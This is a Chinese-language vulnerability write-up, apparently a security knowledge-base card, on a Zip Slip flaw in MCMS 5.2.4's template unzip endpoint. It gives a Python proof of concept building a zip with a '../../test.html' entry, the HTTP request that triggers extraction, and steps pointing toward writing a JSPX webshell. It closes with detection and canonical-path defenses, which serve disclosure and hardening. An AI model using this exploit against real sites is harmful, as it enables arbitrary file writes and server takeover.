---
id: web-java-component-mcms-template-unzip-zipslip
title: MCMS 5.2.4 模板 ZIP 解压 Zip Slip：entry 名 ../../test.html 绕过 tempDir 过滤写入 webapp 根目录
type: scenario
domain: web
path: web/java/component
technique: zipslip-entry-name-escape-descDir
tags:
- web
- java
- mcms
- mingsoft
- zip-slip
- path-traversal
- file-write
- stored-xss
cve: []
severity: high
confidence: high
affected_versions: MCMS（MingSoft CMS）5.2.4（原文审计版本；其他版本未验证）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V223
  verified_at: '2026-11-07T06:48:15+08:00'
  notes: 已对照原文61张图逐张核对：图47-49 /ms/template/unZip.do?fileUrl=/template/1/1672889118817.zip、图50-52 zipFile.getParent() 作 descDir=webapp/template/1、图53 tempDir 仅对 dir.indexOf("..")==-1 的段拼接、图54-56 new File(descDir, entry.getName()) 用原始 ../../test.html 写出、图57 webapp/test.html 落盘、图58 浏览器触发 alert(1) 均与卡一致。未验证点：PoC未本机复跑；RCE 延伸（.jspx）为同原语推断、原文未演示；frontmatter无 sources/source_url；affected_versions按原文审计版本MCMS 5.2.4标注。
url: /docs/web/java/component/web-java-component-mcms-template-unzip-zipslip/
draft: false
kb_aliases:
- MCMS Zip Slip
- MCMS template unZip
- /ms/template/unZip.do
- 模板 ZIP 解压穿越
- ZipArchiveInputStream 解压绕过
---

## 一句话结论

MCMS 后台模板管理的 ZIP 解压接口 `/ms/template/unZip.do` 只检查 `fileUrl` 是否包含 `../`，却对压缩包内的 entry 名不做规范化：解压时虽然把含 `..` 的目录段排除在 `tempDir` 之外，但真正写文件时用的是原始 `entry.getName()`，于是一个名为 `../../test.html` 的条目会写到 `webapp/template/1` 之外的 `webapp/test.html`，访问后执行存储型 XSS 脚本；同理可写入 `.jspx` 等可执行文件。

## 原理

- `TemplateAction.unZip(fileUrl)` 先做 `fileUrl.contains("../") || fileUrl.contains("..\\")` 检查，然后 `new File(BasicUtil.getRealTemplatePath(fileUrl))` 定位 zip，调用 `this.unzip(zipFile, zipFile.getParent())`，`descDir` 即 `.../webapp/template/1`。
- `unzip()` 遍历 `ZipArchiveEntry`：先把 `entry.getName().split("/")`，逐段拼 `tempDir`，但只在 `dir.indexOf("..") == -1` 时拼接并 `FileUtil.mkdir(tempDir)`——这个 `tempDir` 只用于创建目录。
- 真正落盘的代码是 `new FileOutputStream(new File(descDir, entry.getName()))`，直接使用包含 `../../` 的原始条目名；`new File(parent, child)` 不会做规范化，`..` 在文件系统层被解析，于是写出 `descDir` 之外。
- 文中 entry `../../test.html` 从 `webapp/template/1` 上跳两级到 `webapp/test.html`；浏览器访问 `http://host:8081/test.html` 执行 `<script>alert(1)</script>`，证明任意路径写入。
- 解压阶段不校验扩展名，因此把条目换成 `../../shell.jspx` 可把 JSPX WebShell 写到 Web 根目录；文章只演示了 html，RCE 属于同一原语的延伸。

## 触发条件

- 已登录 MCMS 后台且具备 `template:upload` 权限（接口有 `@RequiresPermissions("template:upload")`）。
- 能通过模板管理的 ZIP 上传功能把恶意 zip 放到 `/template/1/` 下，并拿到 `fileUrl`。
- 目标为 5.2.4 或存在同样 `new File(descDir, entry.getName())` 解压写文件的版本。

## 利用步骤

1. 用 Python 生成含穿越条目的 zip：
   ```python
   import zipfile
   z = zipfile.ZipFile('shell.zip', 'w', zipfile.ZIP_DEFLATED)
   z.writestr('../../test.html', '<script>alert(1)</script>')
   z.close()
   ```
2. 登录后台，进入模板管理 → 上传模板 ZIP 包，把 `shell.zip` 上传到 `/template/1/<timestamp>.zip`。
3. 抓包或构造 `GET /ms/template/unZip.do?fileUrl=/template/1/<timestamp>.zip`，携带后台 JSESSIONID。
4. 访问 `http://target:8081/test.html` 验证写入与脚本执行。
5. 若要进一步 RCE，将条目改为 `../../shell.jspx` 并写入 JSPX 内容（需容器支持 `*.jspx`）；文章未演示该延伸。

## PoC

```python
import zipfile
z = zipfile.ZipFile('shell.zip', 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../test.html', '<script>alert(1)</script>')
z.close()
```

```http
GET /ms/template/unZip.do?fileUrl=/template/1/1672889118817.zip HTTP/1.1
Host: target:8081
Cookie: JSESSIONID=<后台会话>
Referer: http://target:8081/ms/template/index.do
```

调试路径显示写入目标为 `F:\...\src\main\webapp\template\1\..\..\test.html`，即 `webapp\test.html`；随后访问 `/test.html` 触发 `alert(1)`。

## 变体与关联

- **条目名编码变体**：`....//`、`..\\`、绝对路径、多层 `../`，取决于解压实现是否只做简单字符串判断。
- **RCE 延伸**：同一写文件原语把 `.jspx`/`.jsp` 写到 webapp 根目录；结合 [[web-java-component-mcms-fileaction-upload-blacklist-jspx-ads]] 的 jspx 可利用性。
- **通用手法**：[[web-generic-file-upload-zip-slip-webshell-write]]、[[web-generic-file-upload-template-batchimport-zipslip-arbitrary-write]]。
- **关联**：[[web-java-component-mcms-dual-route-prefix-auth-bypass]]（后台入口与鉴权前缀）。

## 检测与防御

- **检测**：解压后的文件出现在 `template/` 目录之外；zip 条目名包含 `../`、`..\\` 或绝对路径；访问请求中出现异常 zip 条目。
- **防御**：解压前对每个 `entry.getName()` 做规范化并校验 `canonicalPath.startsWith(descDirCanonical)`；拒绝绝对路径与 `..` 条目；限制解压后的扩展名与目录；后台模板功能加二次权限校验。
